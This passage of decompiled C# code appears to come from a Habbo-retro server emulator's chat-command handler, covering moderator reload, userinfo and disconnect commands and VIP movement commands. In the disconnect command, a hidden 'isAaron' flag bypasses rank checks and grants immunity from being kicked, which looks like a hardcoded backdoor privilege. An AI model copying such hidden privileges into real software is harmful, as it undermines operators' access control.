						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
						if (TargetClient == null || TargetClient.GetHabbo() == null)
						{
							Session.SendNotif("Could not find user: " + text);
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						TargetClient.GetHabbo().Unmute();
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					}
					case 55:
						if (Session.GetHabbo().HasRole("cmd_update_achievements"))
						{
							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
							{
								AchievementManager.LoadAchievements(class5);
							}
							return true;
						}
						return false;
					case 56:
						if (Session.GetHabbo().HasRole("cmd_update_bans"))
						{
							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
							{
								PhoenixEnvironment.GetGame().GetBanManager().LoadBans(class5);
							}
							PhoenixEnvironment.GetGame().GetClientManager().CheckForAllBanConflicts();
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 57:
						if (Session.GetHabbo().HasRole("cmd_update_bots"))
						{
							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
							{
								PhoenixEnvironment.GetGame().GetBotManager().LoadBots(class5);
							}
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 58:
						if (Session.GetHabbo().HasRole("cmd_update_catalogue"))
						{
							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
							{
								PhoenixEnvironment.GetGame().GetCatalog().Initialize(class5);
							}
							PhoenixEnvironment.GetGame().GetCatalog().InitCache();
							PhoenixEnvironment.GetGame().GetClientManager().QueueBroadcaseMessage(new ServerMessage(441u));
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 59:
						if (Session.GetHabbo().HasRole("cmd_update_filter"))
						{
							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
							{
								ChatCommandHandler.InitWords(class5);
							}
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 60:
						if (Session.GetHabbo().HasRole("cmd_update_items"))
						{
							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
							{
								PhoenixEnvironment.GetGame().GetItemManager().LoadItems(class5);
							}
							Session.SendNotif("Item defenitions reloaded successfully.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 61:
						if (Session.GetHabbo().HasRole("cmd_update_navigator"))
						{
							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
							{
								PhoenixEnvironment.GetGame().GetNavigator().LoadNavigator(class5);
								PhoenixEnvironment.GetGame().GetRoomManager().LoadModels(class5);
							}
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 62:
						if (Session.GetHabbo().HasRole("cmd_update_permissions"))
						{
							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
							{
                                PhoenixEnvironment.GetGame().GetRoleManager().LoadRoles(class5);
							}
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 63:
						if (Session.GetHabbo().HasRole("cmd_update_settings"))
						{
							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
							{
								PhoenixEnvironment.GetGame().LoadSettings(class5);
							}
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						return false;
					case 64:
					{
						if (!Session.GetHabbo().HasRole("cmd_userinfo"))
						{
							return false;
						}
						string text5 = Params[1];
						bool flag2 = true;
						if (string.IsNullOrEmpty(text5))
						{
							Session.SendNotif("Please enter a username");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						GameClient class8 = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text5);
						Habbo class9;
						if (class8 == null)
						{
							flag2 = false;
							class9 = Authenticator.GetHabboViaUsername(text5);
						}
						else
						{
							class9 = class8.GetHabbo();
						}
						if (class9 == null)
						{
							Session.SendNotif("Unable to find user " + Params[1]);
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						StringBuilder stringBuilder = new StringBuilder();
						if (class9.CurrentRoom != null)
						{
							stringBuilder.Append(" - ROOM INFORMATION FOR ROOMID: " + class9.CurrentRoom.RoomId + " - \r");
							stringBuilder.Append("Owner: " + class9.CurrentRoom.Owner + "\r");
							stringBuilder.Append("Room name: " + class9.CurrentRoom.Name + "\r");
							stringBuilder.Append(string.Concat(new object[]
							{
								"Users in room: ",
								class9.CurrentRoom.UserCount,
								"/",
								class9.CurrentRoom.UsersMax
							}));
						}
						uint num6 = class9.Rank;
						//if (class9.isAaronble)
						//{
						//	num6 = 1u;
						//}
						string text6 = "";
						if (Session.GetHabbo().HasRole("cmd_userinfo_viewip"))
						{
							text6 = "UserIP: " + class9.LastIp + " \r";
						}
						Session.SendNotif(string.Concat(new object[]
						{
							"User information for user: ",
							text5,
							":\rRank: ",
							num6,
							" \rUser online: ",
							flag2.ToString(),
							" \rUserID: ",
							class9.Id,
							" \r",
							text6,
							"Visiting room: ",
							class9.CurrentRoomId,
							" \rUser motto: ",
							class9.Motto,
							" \rUser credits: ",
							class9.Credits,
							" \rUser pixels: ",
							class9.ActivityPoints,
							" \rUser points: ",
							class9.shells,
							" \rUser muted: ",
							class9.Muted.ToString(),
							"\r\r\r",
							stringBuilder.ToString()
						}));
						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
						return true;
					}
					case 65:
						if (Session.GetHabbo().HasRole("cmd_update_texts"))
						{
							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
							{
								TextManager.LoadTexts(class5);
							}
							return true;
						}
						return false;
					case 66:
					{
						if (!Session.GetHabbo().HasRole("cmd_disconnect"))
						{
							return false;
						}
						string text = Params[1];
						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
						if (TargetClient == null)
						{
							Session.SendNotif("Could not find user: " + text);
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						if (Session.GetHabbo().Rank <= TargetClient.GetHabbo().Rank && !Session.GetHabbo().isAaron)
						{
							Session.SendNotif("You are not allowed to kick that user.");
							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
							return true;
						}
						if (!TargetClient.GetHabbo().isAaron)
						{
							TargetClient.Disconnect();
						}
						return true;
					}
					}
					num = PhoenixEnvironment.GetGame().GetRoleManager().CommandsList[Params[0]];
					if (num <= 13)
					{
						if (num != 1)
						{
							switch (num)
							{
							case 5:
							{
								int num7 = (int)Convert.ToInt16(Params[1]);
								if (num7 > 0 && num7 < 101)
								{
									Session.GetHabbo().BuyCount = (int)Convert.ToInt16(Params[1]);
								}
								else
								{
									Session.GetHabbo().Sendselfwhisper("Please choose a value between 1 - 100");
								}
								return true;
							}
							case 8:
							case 9:
								Session.GetHabbo().GetInventoryComponent().method_0();
								Session.SendNotif(TextManager.GetText("cmd_emptyitems_success"));
								PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
								return true;
							case 10:
								if (Session.GetHabbo().HasRole("cmd_empty") && Params[1] != null)
								{
									GameClient class10 = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
									if (class10 != null && class10.GetHabbo() != null)
									{
										class10.GetHabbo().GetInventoryComponent().method_0();
										Session.SendNotif("Inventory cleared! (Database and cache)");
									}
									else
									{
										using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
										{
											class5.AddParamWithValue("usrname", Params[1]);
											int num8 = int.Parse(class5.ReadString("SELECT Id FROM users WHERE username = @usrname LIMIT 1;"));
											class5.ExecuteQuery("DELETE FROM items WHERE user_id = '" + num8 + "' AND room_id = 0;");
											Session.SendNotif("Inventory cleared! (Database)");
										}
									}
									PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
									return true;
								}
								return false;
							case 12:
							{
								if (!GlobalClass.cmdFlagmeEnabled)
								{
									Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
									return true;
								}
								if (!Session.GetHabbo().Vip)
								{
									Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
									return true;
								}
								ServerMessage Message5_ = new ServerMessage(573u);
								Session.SendMessage(Message5_);
								return true;
							}
							case 13:
								if (!GlobalClass.cmdFollowEnabled)
								{
									Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
									return true;
								}
								if (!Session.GetHabbo().Vip)
								{
									Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
									return true;
								}
								TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
								if (TargetClient != null && TargetClient.GetHabbo().InRoom && Session.GetHabbo().CurrentRoom != TargetClient.GetHabbo().CurrentRoom && !TargetClient.GetHabbo().HideInRom)
								{
									ServerMessage Message5 = new ServerMessage(286u);
									Message5.AppendBoolean(TargetClient.GetHabbo().CurrentRoom.IsPublic);
									Message5.AppendUInt(TargetClient.GetHabbo().CurrentRoomId);
									Session.SendMessage(Message5);
								}
								else
								{
									Session.GetHabbo().Sendselfwhisper("User: " + Params[1] + " could not be found - Maybe they're not online or not in a room anymore (or maybe they're a ninja)");
								}
								PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
								return true;
							default:
								goto IL_3F91;
							}
						}
					}
					else
					{
						switch (num)
						{
						case 28:
						{
							if (!GlobalClass.cmdMimicEnabled)
							{
								Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
								return true;
							}
							if (!Session.GetHabbo().Vip)
							{
								Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
								return true;
							}
							string text = Params[1];
							TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
							if (TargetClient == null)
							{
								Session.GetHabbo().Sendselfwhisper("Could not find user: " + text);
								return true;
							}
							Session.GetHabbo().Look = TargetClient.GetHabbo().Look;
							Session.GetHabbo().method_26(false, Session);
							return true;
						}
						case 29:
						{
							if (!GlobalClass.cmdMoonwalkEnabled)
							{
								Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
								return true;
							}
							if (!Session.GetHabbo().Vip)
							{
								Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
								return true;
							}
							room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
							if (room == null)
							{
								return false;
							}
							RoomUser class3 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
							if (class3 == null)
							{
								return false;
							}
							if (class3.bool_3)
							{
								class3.bool_3 = false;
								Session.GetHabbo().Sendselfwhisper("Your moonwalk has been disabled.");
								return true;
							}
							class3.bool_3 = true;
							Session.GetHabbo().Sendselfwhisper("Your moonwalk has been enabled.");
							return true;
						}
						default:
						{
							RoomUser class6;
							switch (num)
							{
							case 36:
								try
								{
									if (!GlobalClass.cmdPullEnabled)
									{
										Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
										return true;
									}
									if (!Session.GetHabbo().Vip)
									{
										Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
										return true;
									}
									string a = "down";
									string text = Params[1];
									TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
									room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
									if (Session == null || TargetClient == null)
									{
										return false;
									}
									class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
									RoomUser class4 = room.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
									if (TargetClient.GetHabbo().Username == Session.GetHabbo().Username)
									{
										Session.GetHabbo().Sendselfwhisper("You cannot pull yourself");
										return true;
									}
									if (TargetClient.GetHabbo().CurrentRoomId == Session.GetHabbo().CurrentRoomId && Math.Abs(class6.X - class4.X) < 3 && Math.Abs(class6.Y - class4.Y) < 3)
									{
										class6.Chat(Session, "*pulls " + TargetClient.GetHabbo().Username + " to them*", false);
										if (class6.RotBody == 0)
										{
											a = "up";
										}
										if (class6.RotBody == 2)
										{
											a = "right";
										}
										if (class6.RotBody == 4)
										{
											a = "down";
										}
										if (class6.RotBody == 6)
										{
											a = "left";
										}
										if (a == "up")
										{
											class4.MoveTo(class6.X, class6.Y - 1);
										}
										if (a == "right")
										{
											class4.MoveTo(class6.X + 1, class6.Y);
										}
										if (a == "down")
										{
											class4.MoveTo(class6.X, class6.Y + 1);
										}
										if (a == "left")
										{
											class4.MoveTo(class6.X - 1, class6.Y);
										}
										return true;
									}
									Session.GetHabbo().Sendselfwhisper("That user is not close enough to you to be pulled, try getting closer");
									return true;
								}
								catch
								{
									return false;
								}
							case 37:
                                try
                                {
                                    if (!GlobalClass.cmdPushEnabled)
                                    {
                                        Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
                                        return true;
                                    }
                                    if (!Session.GetHabbo().Vip)
                                    {
                                        Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
                                        return true;
                                    }
                                    string a = "down";
                                    string text = Params[1];
                                    TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
                                    room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
                                    if (Session == null || TargetClient == null)
                                    {
                                        return false;
                                    }
                                    class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
                                    RoomUser class4 = room.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
                                    if (TargetClient.GetHabbo().Username == Session.GetHabbo().Username)
                                    {
                                        Session.GetHabbo().Sendselfwhisper("It can't be that bad mate, no need to push yourself!");
                                        return true;
                                    }
                                    bool arg_3DD2_0;
                                    if (TargetClient.GetHabbo().CurrentRoomId == Session.GetHabbo().CurrentRoomId)
                                    {
                                        if ((class6.X + 1 != class4.X || class6.Y != class4.Y) && (class6.X - 1 != class4.X || class6.Y != class4.Y) && (class6.Y + 1 != class4.Y || class6.X != class4.X))
                                        {
                                            if (class6.Y - 1 == class4.Y)
                                            {
                                                if (class6.X == class4.X)
                                                {
                                                    goto IL_3DA6;
                                                }
                                            }
                                            arg_3DD2_0 = (class6.X != class4.X || class6.Y != class4.Y);
                                            goto IL_3DD2;
                                        }
                                    IL_3DA6:
                                        arg_3DD2_0 = false;
                                    }
                                    else
                                    {
                                        arg_3DD2_0 = true;
                                    }
                                IL_3DD2:
                                    if (!arg_3DD2_0)
                                    {
                                        class6.Chat(Session, "*pushes " + TargetClient.GetHabbo().Username + "*", false);
                                        if (class6.RotBody == 0)
                                        {
                                            a = "up";
                                        }
                                        if (class6.RotBody == 2)
                                        {
                                            a = "right";
                                        }
                                        if (class6.RotBody == 4)
                                        {
                                            a = "down";
                                        }
                                        if (class6.RotBody == 6)
                                        {
                                            a = "left";
                                        }
                                        if (a == "up")
                                        {
                                            class4.MoveTo(class4.X, class4.Y - 1);
                                        }
                                        if (a == "right")
                                        {
                                            class4.MoveTo(class4.X + 1, class4.Y);
                                        }
                                        if (a == "down")
                                        {
                                            class4.MoveTo(class4.X, class4.Y + 1);
                                        }
                                        if (a == "left")
                                        {
                                            class4.MoveTo(class4.X - 1, class4.Y);
                                        }
                                    }
                                    return true;
                                }
                                catch
                                {
                                    return false;
                                }
							case 38:
                                room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
							    class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
							    if (class6.IsTrading)
							    {
								    Session.GetHabbo().Sendselfwhisper("Command unavailable while trading");
								    return true;
							    }
							    if (GlobalClass.cmdRedeemCredits)
							    {
								    Session.GetHabbo().GetInventoryComponent().method_1(Session);
							    }
							    else
							    {
								    Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
							    }
                                return true;
							case 40:
							{
								string text = Params[1];
								room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
								class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
								RoomUser class4 = room.method_57(text);
								if (class6.class34_1 != null)
								{
									Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_ride_err_riding"));
									return true;
								}
								if (!class4.IsBot || class4.PetData.Type != 13u)
								{
									Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_ride_err_nothorse"));
									return true;
								}
								bool arg_40EB_0;
								if ((class6.X + 1 != class4.X || class6.Y != class4.Y) && (class6.X - 1 != class4.X || class6.Y != class4.Y) && (class6.Y + 1 != class4.Y || class6.X != class4.X))
								{
									if (class6.Y - 1 == class4.Y)
									{
										if (class6.X == class4.X)
										{
											goto IL_40C2;
										}
									}
									arg_40EB_0 = (class6.X != class4.X || class6.Y != class4.Y);
									goto IL_40EB;
								}
								IL_40C2:
								arg_40EB_0 = false;
								IL_40EB:
								if (arg_40EB_0)
								{
									Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_ride_err_toofar"));
									return true;
								}
								if (class4.BotData.RoomUser_0 == null)
								{
									class4.BotData.RoomUser_0 = class6;
									class6.class34_1 = class4.BotData;
									class6.X = class4.X;
									class6.Y = class4.Y;
									class6.Z = class4.Z + 1.0;
									class6.RotBody = class4.RotBody;
									class6.RotHead = class4.RotHead;
									class6.UpdateNeeded = true;
									room.UpdateUserStatus(class6, false, false);
									class6.Target = class4;
									class6.Statusses.Clear();
									class4.Statusses.Clear();
									Session.GetHabbo().GetAvatarEffectsInventoryComponent().ApplyEffect(77, true);
									Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_ride_instr_getoff"));
									room.GenerateMaps();
									return true;
								}
								Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_ride_err_tooslow"));
								return true;
							}
							default:
								switch (num)
								{
								case 67:
								{
									string text7 = "Your Commands:\r\r";
									if (Session.GetHabbo().HasRole("cmd_update_settings"))
									{
										text7 = text7 + TextManager.GetText("cmd_update_settings_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_update_bans"))
									{
										text7 = text7 + TextManager.GetText("cmd_update_bans_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_update_permissions"))
									{
										text7 = text7 + TextManager.GetText("cmd_update_permissions_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_update_filter"))
									{
										text7 = text7 + TextManager.GetText("cmd_update_filter_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_update_bots"))
									{
										text7 = text7 + TextManager.GetText("cmd_update_bots_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_update_catalogue"))
									{
										text7 = text7 + TextManager.GetText("cmd_update_catalogue_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_update_items"))
									{
										text7 = text7 + TextManager.GetText("cmd_update_items_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_update_navigator"))
									{
										text7 = text7 + TextManager.GetText("cmd_update_navigator_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_update_achievements"))
									{
										text7 = text7 + TextManager.GetText("cmd_update_achievements_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_award"))
									{
										text7 = text7 + TextManager.GetText("cmd_award_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_coords"))
									{
										text7 = text7 + TextManager.GetText("cmd_coords_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_override"))
									{
										text7 = text7 + TextManager.GetText("cmd_override_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_teleport"))
									{
										text7 = text7 + TextManager.GetText("cmd_teleport_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_coins"))
									{
										text7 = text7 + TextManager.GetText("cmd_coins_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_pixels"))
									{
										text7 = text7 + TextManager.GetText("cmd_pixels_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_points"))
									{
										text7 = text7 + TextManager.GetText("cmd_points_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_alert"))
									{
										text7 = text7 + TextManager.GetText("cmd_alert_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_motd"))
									{
										text7 = text7 + TextManager.GetText("cmd_motd_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_roomalert"))
									{
										text7 = text7 + TextManager.GetText("cmd_roomalert_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_ha"))
									{
										text7 = text7 + TextManager.GetText("cmd_ha_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_hal"))
									{
										text7 = text7 + TextManager.GetText("cmd_hal_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_freeze"))
									{
										text7 = text7 + TextManager.GetText("cmd_freeze_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_enable"))
									{
										text7 = text7 + TextManager.GetText("cmd_enable_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_roommute"))
									{
										text7 = text7 + TextManager.GetText("cmd_roommute_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_setspeed"))
									{
										text7 = text7 + TextManager.GetText("cmd_setspeed_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_globalcredits"))
									{
										text7 = text7 + TextManager.GetText("cmd_globalcredits_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_globalpixels"))
									{
										text7 = text7 + TextManager.GetText("cmd_globalpixels_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_globalpoints"))
									{
										text7 = text7 + TextManager.GetText("cmd_globalpoints_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_masscredits"))
									{
										text7 = text7 + TextManager.GetText("cmd_masscredits_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_masspixels"))
									{
										text7 = text7 + TextManager.GetText("cmd_masspixels_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_masspoints"))
									{
										text7 = text7 + TextManager.GetText("cmd_masspoints_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_givebadge"))
									{
										text7 = text7 + TextManager.GetText("cmd_givebadge_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_removebadge"))
									{
										text7 = text7 + TextManager.GetText("cmd_removebadge_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_summon"))
									{
										text7 = text7 + TextManager.GetText("cmd_summon_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_roombadge"))
									{
										text7 = text7 + TextManager.GetText("cmd_roombadge_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_massbadge"))
									{
										text7 = text7 + TextManager.GetText("cmd_massbadge_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_userinfo"))
									{
										text7 = text7 + TextManager.GetText("cmd_userinfo_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_shutdown"))
									{
										text7 = text7 + TextManager.GetText("cmd_shutdown_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_invisible"))
									{
										text7 = text7 + TextManager.GetText("cmd_invisible_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_ban"))
									{
										text7 = text7 + TextManager.GetText("cmd_ban_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_superban"))
									{
										text7 = text7 + TextManager.GetText("cmd_superban_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_ipban"))
									{
										text7 = text7 + TextManager.GetText("cmd_ipban_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_kick"))
									{
										text7 = text7 + TextManager.GetText("cmd_kick_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_roomkick"))
									{
										text7 = text7 + TextManager.GetText("cmd_roomkick_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_mute"))
									{
										text7 = text7 + TextManager.GetText("cmd_mute_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_unmute"))
									{
										text7 = text7 + TextManager.GetText("cmd_unmute_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_sa"))
									{
										text7 = text7 + TextManager.GetText("cmd_sa_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_spull"))
									{
										text7 = text7 + TextManager.GetText("cmd_spull_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_empty"))
									{
										text7 = text7 + TextManager.GetText("cmd_empty_desc") + "\r\r";
									}
									if (Session.GetHabbo().HasRole("cmd_update_texts"))
									{
										text7 = text7 + TextManager.GetText("cmd_update_texts_desc") + "\r\r";
									}
                                    if (Session.GetHabbo().HasRole("cmd_dance"))
                                    {
                                        text7 = text7 + TextManager.GetText("cmd_dance_desc") + "\r\r";
                                    }
                                    if (Session.GetHabbo().HasRole("cmd_rave"))
                                    {
                                        text7 = text7 + TextManager.GetText("cmd_rave_desc") + "\r\r";
                                    }
                                    if (Session.GetHabbo().HasRole("cmd_roll"))
                                    {
                                        text7 = text7 + TextManager.GetText("cmd_roll_desc") + "\r\r";
                                    }
                                    if (Session.GetHabbo().HasRole("cmd_control"))
                                    {
                                        text7 = text7 + TextManager.GetText("cmd_control_desc") + "\r\r";
                                    }
                                    if (Session.GetHabbo().HasRole("cmd_makesay"))
                                    {
                                        text7 = text7 + TextManager.GetText("cmd_makesay_desc") + "\r\r";
                                    }
                                    if (Session.GetHabbo().HasRole("cmd_sitdown"))
                                    {
                                        text7 = text7 + TextManager.GetText("cmd_sitdown_desc") + "\r\r";
                                    }
									if (Session.GetHabbo().Vip)
									{
										if (GlobalClass.cmdMoonwalkEnabled)
										{
											text7 = text7 + TextManager.GetText("cmd_moonwalk_desc") + "\r\r";
										}
										if (GlobalClass.cmdMimicEnabled)
										{
											text7 = text7 + TextManager.GetText("cmd_mimic_desc") + "\r\r";
										}
										if (GlobalClass.cmdFollowEnabled)
										{
											text7 = text7 + TextManager.GetText("cmd_follow_desc") + "\r\r";
										}
										if (GlobalClass.cmdPushEnabled)
										{
											text7 = text7 + TextManager.GetText("cmd_push_desc") + "\r\r";
										}
										if (GlobalClass.cmdPullEnabled)
										{
											text7 = text7 + TextManager.GetText("cmd_pull_desc") + "\r\r";
										}
										if (GlobalClass.cmdFlagmeEnabled)
										{
											text7 = text7 + TextManager.GetText("cmd_flagme_desc") + "\r\r";
										}
									}
									string text8 = "";
									if (GlobalClass.cmdRedeemCredits)
									{
										text8 = text8 + TextManager.GetText("cmd_redeemcreds_desc") + "\r\r";
									}
									string text9 = text7;
									text7 = string.Concat(new string[]
									{
										text9,
										"- - - - - - - - - - - \r\r",
										TextManager.GetText("cmd_about_desc"),
										"\r\r",
										TextManager.GetText("cmd_pickall_desc"),
										"\r\r",
										TextManager.GetText("cmd_unload_desc"),
										"\r\r",
										TextManager.GetText("cmd_disablediagonal_desc"),
										"\r\r",
										TextManager.GetText("cmd_setmax_desc"),
										"\r\r",
										text8,
										TextManager.GetText("cmd_ride_desc"),
										"\r\r",
										TextManager.GetText("cmd_buy_desc"),
										"\r\r",
										TextManager.GetText("cmd_emptypets_desc"),
										"\r\r",
										TextManager.GetText("cmd_emptyitems_desc")
									});
									Session.SendNotif(text7, 2);
									return true;
								}
								case 68:
									DateTime now = DateTime.Now;
                                    TimeSpan timeSpan = now - PhoenixEnvironment.ServerStarted;
					                int UsersOnline = PhoenixEnvironment.GetGame().GetClientManager().ClientCount + -1;
				    	            int RoomsLoaded = PhoenixEnvironment.GetGame().GetRoomManager().LoadedRoomsCount;
					                string text10 = "";
					                if (GlobalClass.ShowUsersAndRoomsInAbout)
					                {
						                text10 = string.Concat(new object[]
						                {
                                            "\nUsers Online: ",
                                            UsersOnline,
							                "\nRooms Loaded: ",
							                RoomsLoaded
						                });
					                }
					                Session.SendNotif(string.Concat(new object[]
					                {
						                "Phoenix 3.0\n\nThanks/Credits;\nSojobo [Lead Dev]\nMatty [Dev]\nRoy [Uber Emu]\n\n",
						                PhoenixEnvironment.PrettyVersion,
                                        //"\nLicenced to: ",
                                        //Phoenix.username,
						                "\n\nUptime: ",
						                timeSpan.Days,
						                " days, ",
						                timeSpan.Hours,
						                " hours and ",
						                timeSpan.Minutes,
						                " minutes",
						                text10,
                                    }), "http://otaku.cm");
                                    return true;
								case 69:
								{
									StringBuilder builder = new StringBuilder();
									for (int i = 0; i < Session.GetHabbo().CurrentRoom.UserList.Length; i++)
									{
										class6 = Session.GetHabbo().CurrentRoom.UserList[i];
										if (class6 != null)
										{
											builder.Append(string.Concat(new object[]
											{
												"UserID: ",
												class6.HabboId,
												" RoomUID: ",
												class6.CurrentFurniFX,
												" VirtualID: ",
